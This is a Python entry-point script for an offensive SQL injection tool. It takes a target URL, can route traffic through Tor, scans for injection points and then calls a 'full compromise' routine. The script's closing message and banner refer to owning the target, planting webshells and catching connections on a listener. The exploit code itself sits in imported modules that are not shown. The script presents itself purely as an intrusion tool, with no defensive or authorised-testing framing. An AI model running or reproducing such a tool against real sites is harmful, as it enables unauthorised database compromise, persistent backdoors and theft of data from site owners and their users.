# run.py — single entry point
# python run.py -u https://target.com

import argparse
import os
from scanner import GodTierScanner
from exploiter import full_compromise_all
import config

parser = argparse.ArgumentParser(description="Ultimate SQLi Tool — One command to rule them all")
parser.add_argument("-u", "--url", required=True, help="Target URL")
parser.add_argument("--tor", action="store_true", help="Route through Tor")
args = parser.parse_args()

print("""
╔══════════════════════════════════════════════════════════╗
║              ULTIMATE SQLi TOOL v3.0 FINAL               ║
║           Discovery → Exploitation → Total Own          ║
╚══════════════════════════════════════════════════════════╝
""")

# Phase 1 — Discovery
scanner = GodTierScanner(args.url)
scanner.scan()                       # → creates godtier_results_*.json

# Phase 2 — Full compromise
full_compromise_all()                # automatically loads latest results

print("\nTarget fully owned. Check webshells/, results/, and your listener.")
